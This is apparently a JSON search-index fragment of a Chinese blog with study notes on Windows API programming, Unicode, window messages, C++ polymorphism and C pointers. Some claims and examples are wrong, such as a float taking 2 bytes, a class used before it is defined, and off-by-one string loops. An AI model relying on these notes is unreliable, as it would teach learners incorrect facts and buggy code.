pszCmdLine, int nCmdShow); 123456- ```c int WINAPI wWinMain(HINSTANCE hinstExe, HINSTANCE , PSTR pszCmdLine, int nCmdShow); int __cdecl main( int argc, char *argv[], char *envp[] ) 1234567- ```c++ int __cdecl wmain( int argc, char *argv[], char *envp[] ) 所有C/C++运行期启动函数的作用是相同的，差别在于，它们到底处理的是ANCII还是UNICODE字符串。 启动函数的功能如下： 检索指向新进程的完整命令行的指针。 检索指向新进程的环境变量的指针。 对C/C++运行期的全局变量进行初始化。 对C运行期内存单位分配函数(malloc和calloc)和其他低层输入/输出例程使用的内存栈进行初始化。 为全局的和静态的C++类对象调用构造函数。 进程的实例句柄加载到进程地址空间的每个执行文件或DLL文件都被赋予一个独一无二的实例句柄。可执行文件的实例作为(w)WinMain的第一个参数hinstExe来传递。 1234HICON LoadIconA( HINSTANCE hInstance, //模块实例的句柄，其可执行文件包含要加载的图标 LPCSTR lpIconName //要加载的图标资源的名称); 有些函数需要HMODULE函数的一个类型： 12345DWORD GetModuleFileName( HMODULE hModule, //正在请求其路径的已加载模块的句柄 LPSTR lpFilename, //指向缓冲区的指针，该缓冲区接收模块的标准路径 DWORD nSize //返回的字符串将使用加载模块时指定的格式); HMODULE和HINSTANCE是完全相同的对象 (w)WinMain和hinstExe参数的实际值是系统将可执行文件的映象加载到进程的地址空间时使用的基本地址空间。可执行文件的映像加载到内存的基地址是由链接程序来决定的。不同的链接程序使用不同的默认基地址。VC6使用的默认基地址是0x00400000，这是因为在运行Windows98的时候可执行文件的映像可以加载到的最低地址。改变程序加载的基地址是由链接程序中的/BASE:address链接程序开关。 GetModuleHandle函数返回可执行文件加载内存地址空间时所用的句柄/基地址： 12345678910int WINAPI wWinMain(HINSTANCE hinstExe, HINSTANCE , PSTR pszCmdLine, int nCmdShow){ HMODULE Address = GetModuleHandle(NULL); cout &lt;&lt; Address &lt;&lt; endl; return 0;} GetModuleHandle的两个重要特性： 它只能查看调用进程的地址空间 调用GetModuleHandle并传递NULL值，就会返回进程的地址空间中可执行文件的基地址。 前一个实例句柄在C/C++运行期启动代码总是将NULL传递给(w)WinMain的HinstExePrev参数。 1234int WINAPI WinMain(HINSTANCE hinstExe, HINSTANCE, PSTR pszCmdLine, int nShowCmd){ return 0;} 进程的命令行当一个新的进程被创建后，它要传递一个命令行。该命令行几乎永远不为空，至少用于创建新进程的可执行文件的名字是命令行的第一个标识符。当C/C++运行期的启动代码开始运行的时候，它要检索进程的命令行，跳过可执行文件的名字，并将指向命令行其余部分的指针传递给WinMain的pszCmdLine参数。 pszCmdLine参数指向一个ANSI字符串。 我们可以使用GetCommandLine函数获取一个指向进程的完整命令行的指针： 12345678910int main(void){ LPSTR szCommand = GetCommandLineA(); cout &lt;&lt; szCommand &lt;&lt; endl; return 0;} 我们可以使用CommandLineToArgvW来访问命令行各个组成部分 1234567891011121314151617181920int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE prevInstance, LPSTR lpCmdLine, int nShowCmd){ int nNumArgs; LPWSTR* szArglist = NULL; szArglist = CommandLineToArgvW(GetCommandLineW(), &amp;nNumArgs); if (szArglist == NULL) { cout &lt;&lt; GetLastError() &lt;&lt; endl; return -1; } for (size_t i = 0; i &lt; nNumArgs; i++) { MessageBox(NULL, szArglist[i], L&quot;sYstmek1t&quot;, MB_OK); } HeapFree(GetProcessHeap(), 0, szArglist); return 0;} 进程的环境变量每个进程都有一个与它相关的环境块。环境块是进程的地址空间中分配的一个内存块。每个环境块都包含一组字符串； 子进程可以继承一组与父进程相同的环境变量。但是父进程能够控制子进程继承什么环境变量，继承指的是子进程获取它自己的父进程的环境块拷贝，子进程与父进程并不共享相同的环境块。这意味着子进程可以随意增加或删除它自身环境块中的变量，而这个变化在父进程的环境块中却不会被修改。 GetEnvironmentVariableW如果需要使用环境变量，那么可以使用以下函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283int main(){ /*DWORD GetEnvironmentVariableW( LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize );*/ TCHAR buffer[MAX_PATH]; DWORD dwVariable = GetEnvironmentVariable(L&quot;WINDIR&quot;, buffer, MAX_PATH); GetEnvironmentVariable(L&quot;SYSTEMROOT&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;SYSTEMROOT:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;SYSTEMDRIVE&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;SYSTEMDRIVE:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;HOMEDRIVE&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;HOMEDRIVE:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;USERPROFILE&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;USERPROFILE:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;HOMEPATH&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;HOMEPATH:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;TMP&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;TMP:\\t\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;TEMP&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;TEMP:\\t\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;APPDATA&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;APPDATA:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;PROGRAMFILES&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;PROGRAMFILES:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;COMMONPROGRAMFILES&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;COMMONPROGRAMFILES:\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;USERNAME&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;USERNAME:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;ALLUSERSPROFILE&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;ALLUSERSPROFILE:\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;OS&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;OS:\\t\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;COMPUTERNAME&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;COMPUTERNAME:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;NUMBER_OF_PROCESSORS&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;NUMBER_OF_PROCESSORS:\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;PROCESSOR_ARCHITECTURE&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;PROCESSOR_ARCHITECTURE:\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;PROCESSOR_LEVEL&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;PROCESSOR_LEVEL:\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;PROCESSOR_REVISION&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;PROCESSOR_REVISION:\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;USERDOMAIN&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;USERDOMAIN:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;COMSPEC&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;COMSPEC:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;PATHEXT&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;PATHEXT:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; GetEnvironmentVariable(L&quot;PATH&quot;, buffer, MAX_PATH); std::wcout &lt;&lt; L&quot;PATH:\\t\\t&quot; &lt;&lt; buffer &lt;&lt; std::endl; return 0;}","link":"/2020/04/17/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B-%E8%BF%9B%E7%A8%8B/"},{"title":"Windows核心编程 - 错误处理","text":"调用Windows函数得时候，它会首先验证我们传递得参数，然后再执行任务。如果传递参数无效，或者由于其他原因无法执行得，则函数得返回值将指出函数因为某些原因失败了。 函数返回值类型数据类型常见的函数返回值数据类型 VOID：这个函数不可能失败，只有少数API函数使用返回值类型为VOID BOOL：这个函数失败，返回值则为0。否则返回值就是一个非0值。 HANDLE：如果函数失败，返回值为null，否则，HANDLE将标识一个可以操纵得句柄对象。 PVOID：如果函数调用失败，则返回值为NULL，否则，PVOID将标识一个数据块得内存地址。 LONG/DWORD：返回计数得函数通常返回一个LONG或DWORD。如果函数失败，则通常返回0或-1。 如果当Windows函数检测到错误得时候，它会使用一种名为”现程本地存储区”得机制将相对应得错误代码与”主调现程”关联到一起。这种机制使得不同得现程可以独立运行，不会出现互相干扰对方现程错误码得情况。 Windows函数调用之后，应当马上调用GetLastError，因为假如调用了另外一个函数，则获取得错误值可能会改变。 写一个小例子来实现一下这个功能： 1234567891011121314151617181920#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(){ HANDLE File = CreateFile( &quot;F:\\\\123.txt&quot;, 0, 0, NULL, OPEN_EXISTING, 0, NULL ); if (File == INVALID_HANDLE_VALUE) //检查函数是否成功 { printf(&quot;Error:%d\\n&quot;, GetLastError()); //不成功则获取错误返回值 } system(&quot;pause&quot;);} 这一章主要得核心思想就是如何获取返回得错误值，自定义自己得错误代码不作为重点。","link":"/2020/04/14/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"},{"title":"Windows程序设计 - Unicode","text":"UnicodeUnicode扩展自ASCII字符集。ASCII每个字符用7位表示；而Unicode使用全16位字符集。 字符集扩展ASCIIMS-DOS3.3向PC用户引入了代码页的概念，Windows也使用该概念。代码页定义了字符的映像代码。 宽字符和C对C语言来说，一个char和一个字节同宽是最不确定的事情之一。 char数据形态12345char c = 'A'; //变量c需要一个字节来保存大写的A，并且使用16巾纸数字0x41初始化，这是A的ASCII代码char *p; //指针变量p需要4字节来保存char* p = &quot;Hello; //变量p需要4个字节来保存，该字符串在静态内存中占用七个字节；char a[10]; //编译器位该数组保留了10字节的存储空间。static char a[] = &quot;Hello&quot;; // 宽字符Unicode或者宽字符都没有改变char类型在C中定义。char继续表示一个字节的存储空间。理论上来说：C中1个字节比八位长，但对于我们来说，一个字节是八位宽。 C语言中的宽字符基于wchar_t的数据类型，它在WCHAR.H中定义。 1234typedef unsigned short wchar_t;wchar_t c = 'A'; //变量c是一个双字节的值0x0041，是Unicode表示的字母Awchar_t* p = L&quot;Hello!&quot;; //大写的字母L代表LONGstatic wchar_t a[] = L&quot;Hello!&quot;; //该字符串需要14个字节的存储空间 大写的字母L代表LONG，这将高速编译器该字符按照宽字符保存，每个字符占用2个字节 原始码如果我们现在定义了名为_UNICODE的标识符，并且程序中包含了TCHAR.H表头文件，那么TCSLEN就是定义为WCSLEN: 123#define _tcslen wcslen //如果没有定义UNICODE，则tcslen定义为wcslen#define _tcslen strlen #feine _T(x) L##x 宽字符和WindowsWindows NT从底层支持Unicode； Windows表头文件类型123456789#ifdef UNICODEtypedef WCHAR TCHAR, * PTCHAR;typedef LPWSTR LPTCH,PTCH,PTSTR,LPTSTR;typedef LPCWSTR LPCTSTR;#elsetypedef char TCHAR, * PTCHAR;typedef LPSTR LPTCH,PTCH,LPTSTR;typedef LPCSTR LPCTSTR;#endif Windows函数呼叫1int WINAPI MessageBox(HWND,LPCSTR,LPCSTR,UINT); //参数二三指向常量字符串指针 这样的函数一般分为两个版本：A版本和W版本； A版本定义如下： 12345678WINUSERAPIintWINAPIMessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType); W版本定义如下： 12345678WINUSERAPIintWINAPIMessageBoxW( _In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType); Windows的字符串函数下面是Windows定义的一组字符串函数 123456iLength = lstrlen(pString);pString = lstrcpy(pString1,pString2);pString = lstrcpyn(pString1,pString2,iCount);pString = lstrcat(pString1,pString2);iComp = lstrcmp(pString1,pString2);iComp = lstrcmpi(pString1,pString2); Windows中使用Printf12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tchar.h&gt;#pragma warning(disable:4996)int CDECL MessageBoxPrintf(TCHAR* szCaption, TCHAR* szFormat, ...){ TCHAR szBuffer[1024]; va_list pArgList; // The va_start macro (defined in STDARG.H) is usually equivalent to: // pArgList = (char *) &amp;szFormat + sizeof (szFormat) ; va_start(pArgList, szFormat); // The last argument to wvsprintf points to the arguments _vsntprintf(szBuffer, sizeof(szBuffer) / sizeof(TCHAR), szFormat, pArgList); // The va_end macro just zeroes out pArgList for no good reason va_end(pArgList); return MessageBox(NULL, szBuffer, szCaption, 0);}int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR nzCmdLine, INT iShowCmd){ int cxScreen, cyScreen; cxScreen = GetSystemMetrics(SM_CXSCREEN); cyScreen = GetSystemMetrics(SM_CYSCREEN); MessageBoxPrintf(_T(&quot;ScrnSize&quot;), _T(&quot;The screen is %i pixels wide by %i pixels high.&quot;), cxScreen, cyScreen); return 0;}","link":"/2020/08/21/Windows%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-Unicode/"},{"title":"Windows程序设计 - 窗口和消息","text":"窗口类定义了窗口的一般特征，因此可以使用同一窗口类别建立许多不同的窗口。 窗口窗口注册类RegisterClass 设计窗口关键字 123ATOM RegisterClassA( const WNDCLASSA *lpWndClass //指向WNDCLASS结构指针); lpWndClass指向WNDCLASS结构指针，在将结构体传递给该函数之前，必须进行适当的类属性填充 123456789101112typedef struct tagWNDCLASSA { UINT style; WNDPROC lpfnWndProc; int cbClsExtra; int cbWndExtra; HINSTANCE hInstance; HICON hIcon; HCURSOR hCursor; HBRUSH hbrBackground; LPCSTR lpszMenuName; LPCSTR lpszClassName;} WNDCLASSA, *PWNDCLASSA, *NPWNDCLASSA, *LPWNDCLASSA; 窗口创建实际调用CreateWindow建立窗口时，可能指定有关窗口的更详细的信息。 窗口风格： WS_CHILD 子窗口WS_OVERLAPPED 重叠窗口WS_POPUP 弹出窗口 1234567891011121314HWND CreateWindowExA( DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam); 显示窗口showWindow 显示窗口的API 1234BOOL ShowWindow( HWND hWnd, //窗口句柄 int nCmdShow //控制窗口的显示方式); 更新窗口UpdateWindow 更新窗口 123BOOL UpdateWindow( HWND hWnd); 消息循环GetMessage 获取消息123456BOOL GetMessage( LPMSG lpMsg, //指向MSG结构的指针 HWND hWnd, //要获取其消息的窗口的句柄 UINT wMsgFilterMin, //要检索的最低消息值的整数值 UINT wMsgFilterMax //要检索的最高消息值的整数值 ); PostQuitMessage终止消息123void PostQuitMessage( int nExitCode //程序退出代码); 窗口回调函数CALLBACK 回调 DefWndi 处理 检查错误API1_Post_equals_last_error_ DWORD GetLastError(); @err,hr 在监视窗口输入查看当前错误*(unsigned long*)(tib + 0x34),hr 同上（兼容版）dwErrCode,hr 同上 位运算在windows编程中广泛应用 wsprintf C语言的调用约定 消息Windows是基于消息的操作系统，所有的事件都会进入消息队列进行处理； 消息循环1234567MSG msg = {};while (GetMessage(&amp;msg, NULL, 0, 0)) //从消息队列中获取消息{ TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); //派发消息} 常见消息WM_CREATE当一个应用程序通过CreateWindowEx函数或者CreateWindow函数请求创建窗口时发送此消息，(此消息在函数返回之前发送)。 产生时间是窗口创建之后显示之前，同时WM_CREATE也必须是不进队列消息。 123case WM_CREATE: //窗口创建完成，消息只有一次 //MessageBox(NULL, &quot;WM_CREATE&quot;, &quot;sYstemk1t&quot;, MB_OK); break; WM_DESTROY123case WM_DESTROY: PostQuitMessage(0); return 0; WM_PAINT1234567891011case WM_PAINT: { PAINTSTRUCT ps; HDC hdc = BeginPaint(hwnd, &amp;ps); FillRect(hdc, &amp;ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1)); EndPaint(hwnd, &amp;ps); } WM_SIZE消息投递PostMessage投递到消息队列 123456BOOL PostMessageA( HWND hWnd, //窗口句柄 UINT Msg, //要发布的消息 WPARAM wParam, //其他特定于消息的信息 LPARAM lParam //其他特定于消息的信息); SendMessage直接调用窗口过程 123456LRESULT SendMessage( HWND hWnd, //窗口句柄 UINT Msg, //要发布的消息 WPARAM wParam, //其他特定于消息的信息 LPARAM lParam //其他特定于消息的信息);","link":"/2020/08/21/Windows%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E7%AA%97%E5%8F%A3%E5%92%8C%E6%B6%88%E6%81%AF/"},{"title":"c++ - 多态","text":"多态是在不同继承关系的类对象，去调同一函数，产生了不同的行为。 多态多态条件多态是在不同继承关系的类对象，去调同一函数，产生了不同的行为。 就是说，有一对继承关系的两个类，这两个类里面都有一个函数且名字、参数、返回值均相同，然后我们通过调用函数来实现不同类对象完成不同的事件。 多态成立条件： 必须存在继承 必须存在函数重写 要有基类指针指向子类对象 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;iostream&gt;using namespace std;//定义一个子类和父类class Parent{public: Parent(int a = 0) { this-&gt;a = a; } virtual void Print() { cout &lt;&lt; &quot;父类:&quot; &lt;&lt; a &lt;&lt; endl; }protected:private: int a;};class Child : public Parent{public: Child(int b = 0) { this-&gt;b = b; } virtual void Print() { cout &lt;&lt; &quot;子类:&quot; &lt;&lt; b &lt;&lt; endl; } protected:private: int b;};void HowToPrint1(Parent *p){ p-&gt;Print();}void HowToPrint2(Parent &amp;myp){ myp.Print();}int main(){ Parent p1(1); Child c1(0); /* p1.Print(); c1.Print(); //赋值兼容 Parent *p = NULL; p = &amp;p1; p-&gt;Print(); p = &amp;c1; p-&gt;Print(); //两个同名函数,子类对象赋值给父类 Parent &amp;p2 = c1; p2.Print(); */ HowToPrint1(&amp;p1); HowToPrint1(&amp;c1); HowToPrint2(p1); HowToPrint2(c1); system(&quot;pause&quot;); return 0;} 多态案例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;iostream&gt;using namespace std;class HeroFighter{public: virtual int Power() { return 10; }};class AdvHeroFighter : public HeroFighter{public: virtual int Power() { return 20; }protected:private:};class EnemyFighter{public: int attack() { return 15; }protected:private:};void objPlay(HeroFighter *pHf, EnemyFighter *pEf){ if (pHf-&gt;Power() &lt; pEf-&gt;attack()) { cout &lt;&lt; &quot;我方失败&quot; &lt;&lt; endl; } else { cout &lt;&lt; &quot;我方胜利&quot; &lt;&lt; endl; }}void main(){ HeroFighter hf; EnemyFighter ef; AdvHeroFighter advf; Adv2HeroFighter advf2; objPlay(&amp;hf,&amp;ef); objPlay(&amp;advf,&amp;ef); system(&quot;pause&quot;); } 多态意义接着上面的代码继续修改 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;using namespace std;class HeroFighter{public: virtual int Power() { return 10; }};class AdvHeroFighter : public HeroFighter{public: virtual int Power() { return 20; }protected:private:};class Adv2HeroFighter : public HeroFighter{public: virtual int Power() { return 30; }protected:private:};class EnemyFighter{public: int attack() { return 15; }protected:private:};void objPlay(HeroFighter *pHf, EnemyFighter *pEf){ if (pHf-&gt;Power() &lt; pEf-&gt;attack()) { cout &lt;&lt; &quot;我方失败&quot; &lt;&lt; endl; } else { cout &lt;&lt; &quot;我方胜利&quot; &lt;&lt; endl; }}void main(){ HeroFighter hf; EnemyFighter ef; AdvHeroFighter advf; Adv2HeroFighter advf2; objPlay(&amp;hf,&amp;ef); objPlay(&amp;advf,&amp;ef); objPlay(&amp;advf2, &amp;ef); system(&quot;pause&quot;); } 多态的本质就是函数指针做函数参数 重写重定义重载的区别123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include &lt;cstdlib&gt;#include &lt;iostream&gt;using namespace std;class Parent01{public: Parent01() { cout&lt;&lt;&quot;Parent01:printf()..do&quot;&lt;&lt;endl; }public: void func() { cout&lt;&lt;&quot;Parent01:void func()&quot;&lt;&lt;endl; } void abcd() { cout&lt;&lt;&quot;Parent01:void func()&quot;&lt;&lt;endl; } virtual void func(int i) { cout&lt;&lt;&quot;Parent:void func(int i)&quot;&lt;&lt;endl; } virtual void func(int i, int j) { cout&lt;&lt;&quot;Parent:void func(int i, int j)&quot;&lt;&lt;endl; }};//重写的两种情况//如果函数重写，在父类中增加了virtual关键字, 将能产生多态。。。。//如果函数重写，没有加virtual关键字，，相当于在子类中重定义。。。。。，不会发生多态。。。class Child01 : public Parent01{public: //原因是发生了 名称覆盖，把子类中的没有函数参数的，这个函数abcd名称覆盖了。。。 //在子类中，是不能重载父类的函数的。编译器就是这么做的，顺从。。。。 void abcd(int a, int b) { cout&lt;&lt;&quot;Parent01:void func()&quot;&lt;&lt;endl; } //此处2个参数，和子类func函数是什么关系 void func(int i, int j) { cout&lt;&lt;&quot;Child:void func(int i, int j)&quot;&lt;&lt;&quot; &quot;&lt;&lt;i + j&lt;&lt;endl; } //此处3个参数的，和子类func函数是什么关系 void func(int i, int j, int k) { cout&lt;&lt;&quot;Child:void func(int i, int j, int k)&quot;&lt;&lt;&quot; &quot;&lt;&lt;i + j + k&lt;&lt;endl; }};void run01(Parent01* p){ p-&gt;func(1, 2);}int main(){ Parent01 p; p.func(); p.func(1); p.func(1, 2); Child01 c; //c.Parent01::abcd(); //这个函数是从父类中继承而来 可以使用。。。 //子类和父类有相同的名字（变量名字或者是函数名字的时，子类名字覆盖父类名字，如果想使用父类的资源，需要加::） c.Parent01::func(); //问题1 这个函数是从父类中继承而来，为什么这个地方不能使用 //c.func(); //问题1 //c.func(1, 2); /* run01(&amp;p); run01(&amp;c); */ system(&quot;pause&quot;); return 0;}//问题1：child对象继承父类对象的func，请问这句话能运行吗？why//c.func(); //1子类里面的func无法重载父类里面的func //2当父类和子类有相同的函数名、变量名出现，发生名称覆盖//3//c.Parent::func();//问题2 子类的两个func和父类里的三个func函数是什么关系？ 函数重载： 函数重载必须在同一个类中 子类无法继承父类的函数，父类同名函数将被名称覆盖 重载是在编译期间根据参数类型和个数决定函数调用 函数重写： 必须发生在父类与子类之间 父类与子类中的函数必须有完全相同的类型 使用virtual声明之后能够产生多态 多态是在运行期间根据具体对象的类型决定函数调用","link":"/2020/09/17/c-%E5%A4%9A%E6%80%81/"},{"title":"c与指针-第七章","text":"指针、值和类型、指针变量的内容、间接访问操作符、未初始化指针和非法的指针、NULL指针、指针、间接访问和左值、指针常量、指针的指针、指针表达式、实例、指针运算 指针内存和地址内存中一般数据称为字节（byte），一个字节占八位，这也就是为什么我们在vs中看到内存单元都是二字节并列在一起。在许多现代的计算机中，一个字节可以占八位，然后每一个内存单元的寻址是从0-f（十六进制）。 我们在学习汇编的时候，学习了字的概念，每个字由2-4个字节组成，（字单元也分高位和低位）。 尽管了一个字包含了4个字节，但是它仍然只有一个内存地址（不可重复）。 硬件依然是通过地址访问内存位置 值和类型int a = 123; //4字节 float c = 3.14; //2字节 *int b = &a; //4字节，指针就占这么多 *float d = &c; //4字节，无论任何类型的指针都是4字节 指针变量的内容1234int a = 123,b = -1;float c = 3.14;int *d = &amp;a; 执行完毕后 123456789101112int a = 123, b = -1;float c = 3.14;int *d = &amp;a;float *e = &amp;c;printf(&quot;%d\\r\\n&quot;, a);printf(&quot;%d\\r\\n&quot;, b);printf(&quot;%f\\r\\n&quot;, c);printf(&quot;%d\\r\\n&quot;, *d);printf(&quot;%f\\r\\n&quot;, *e);system(&quot;pause&quot;); 为什么加了负号，但是还是正常打印了呢，默认的int是一个有无符号叔，但是可以通过unsigned这个参数来定义有无符号。 如果要打印指针所对应的变量的值，记得要加，在中指针中代表取内容 间接访问操作符 定义的时候是这样的，我们通过指针来修改变量a的值和变量b的值一样 如果要让一个指针等于一个变量中的值，那么必须加上&amp;，因为指针的操作都是在内存中，所以需要取地址符号 未初始化指针和非法的指针123int *a;*a = 12; 上面就是一个常见的错误，这两行代码说明了定义个a指针变量，然后给a里赋值一个整形，但是为什么错了呢？没有考虑过a到底指向的是什么？ 在vs中调试，vs直接抛异常，证明了错误，这个时候vs的监视窗口也不知道a到底指向哪一块内存地址，而且代码中你还要为这一块不知道在哪里的内存赋值，所以报错了。 正确的写法： NULL指针c语言标准中定义了NULL指针，它作为一个特别的指针变量，表示不知想任意东西。 你就是一个没人要的野指针… 如果定义一个指针，并且不给他进行初始化的时候，这个时候，这个指针就是一个野指针，因为没有任何人知道它指向的是什么。 比如说还有我们用的无类型指针void *； 指针、间接访问和左值左值：就是写在表达式左边的值，可以是变量 间接访问123456int a;int *d =&amp;a;*d = 10 - *d; //d = 10 - a的值d = 10 - *d; //结果保存在一个指针变量中， 当表达式中包含指针类型的时候，使用指针类型去接受它的值，不然的话，最后的结果将无法预料 在vs2013中，上面的写法并无语法的错误，但是结果并不是想要的结果 指针、间接访问和变量12*&amp;a = 25; 上面语句的意思是把25赋值给变量a。 &amp;操作符产生变量a的地址，它是一个指针常量。 *操作符访问其操作数表示的地址，操作数是a的地址，所以值25存储与a中。 起始它和a = 25的功能是相同的。 指针常量没懂的章节 int b = 100; int *a = &b; *(int *)100 = 25; //100是一个整形，但是c语言的命名规范不允许出现数字开头啊，就当100是常量，那100是指向那里的？ 指针的指针123int a = 12;int *b = &amp;a; 他们的内存分配就是： 变量a去开辟了一块内存，然后指针b指向变量a，这个时候，他们两个共同使用这块内存空间 1234int a = 12;int *b = &amp;a;int **c = &amp;b; 这个时候内存分配就是： 变量a去开辟了一块内存，然后指针b指向变量a，这个时候，他们两个共同使用这块内存空间，然后这个时候c也来了，直接等于指针b指向的内存位置，这个内存位置里存储的是什么呢？就是12； 他们三个变量都指向了同一块内存空间。 可以简单的理解就说：指向指针的指针，就得是两个**，几级指针，就有几个星号 指针表达式123char ch = 'a';char *cp = &amp;ch; 12345char ch = 'a';char *cp = &amp;ch;*(cp+1);system(&quot;pause&quot;); 指针是可以执行和变量一样的自增运算，但是得考虑优先级，（）的优先级比较高 上面的例子可能不太直观 看cp变量中的内容，存储的是一个地址。 &amp;ch ：右值，表示ch的地址信息，ch的地址是0x033fd0f cp ：右值，表示cp中的内容，即ch的地址信息 &amp;cp ： 右值，表示cp的地址信息，即ch地址中的数据 *cp ： 右值：表示ch中的内容，左值：表示ch这个地址空间 *cp + 1： 右值： 首先把a字符做一次拷贝，然后+1，得到b，不可以做左值 *(cp+1): 右值:它作为指针加法运算的结果的一个右值，表示ch的下一个地址，做右值就是读取ch下一个地址中的数据内容，做左值表示ch下一个地址空间 ++cp与cp++ ：做坐右值都因为没有清晰的位置定义，所以不合法，不用背 ++cp与cp++ ： 进行了一次指针运算即间接访问操作，对于右值来说，就是自增一次内存空间对应的数据，对于左值来说，就是地址信息 123456789101112131415161718192021222324252627282930int main(){ char ch = 'a'; char *cp = &amp;ch; char *cd = NULL; printf(&quot;%p\\r\\n&quot;, &amp;ch); printf(&quot;%c\\r\\n&quot;, ch); printf(&quot;%p\\r\\n&quot;, cp); printf(&quot;%p\\r\\n&quot;, &amp;cp); printf(&quot;%c\\r\\n&quot;, *cp); printf(&quot;%p\\r\\n&quot;, cp); cd = *cp + 1; printf(&quot;%p\\r\\n&quot;, &amp;ch); printf(&quot;%c\\r\\n&quot;, cd); cd = *++cp; printf(&quot;%p\\r\\n&quot;, &amp;cd); cd = *(cp + 1); printf(&quot;%c\\r\\n&quot;, cd); } 实例计算字符串的长度 12345678910111213141516171819int strlen_len_len(char *s){ int i = 0; char *p = s; while (*p++ || *p != '\\0') { i++; } return i;}int main(){ char *s = &quot;hello&quot;; int i; i = strlen_len_len(s); printf(&quot;%d\\r\\n&quot;, i);} 字符串查找 1234567891011121314151617181920212223char find(char *s,char name){ char *p = s; while (*p++ != '\\0') { if (*p == name) { return *p; } } return 0;}int main(){ char c = 0; char *s = &quot;iamstudent&quot;; char a = 'u'; c = find(s, a); printf(&quot;%c\\r\\n&quot;, c);} 指针运算指针之间的运算，如果是一个int+float呢，所有的指针都是占4个字节，所以无论怎么算，哪怕它是一个双精度浮点数，做加法也是将float调整（相乘）。 比如使用float类型的指针+3的表达式，这个3将根据float的大小，成衣4，这样，相当于我们的整形指针现在的值就是12 算术运算c的指针算术运算只限于两种形式，（+、-） 并且这类表达式的结果也是指针。 指针做加法： 123456789#include &lt;stdio.h&gt;float values[5];flaot *cp;for(vp = 